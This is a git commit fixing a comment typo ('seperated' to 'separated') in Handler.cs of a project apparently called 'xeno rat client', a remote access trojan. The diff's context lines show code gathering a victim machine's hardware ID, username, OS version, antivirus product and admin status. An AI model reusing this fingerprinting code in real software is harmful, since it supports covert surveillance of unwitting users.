d8d8f1765b2c8fcb12b2607967336e0aa8fbf709
Ikko Eltociear Ashimine <eltociear@gmail.com>
2024-03-02 02:38:07 +0900

    Update Handler.cs
    seperated -> separated

--- xeno rat client/Handler.cs
+++ xeno rat client/Handler.cs
@@ -57,7 +57,7 @@ namespace xeno_rat_client
             {
                 return;
             }
-            //get hwid, username etc. seperated by null
+            //get hwid, username etc. separated by null
             string clientversion = "1.8.7";//find a way to get the client version.
             string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
             byte[] data = new byte[0];
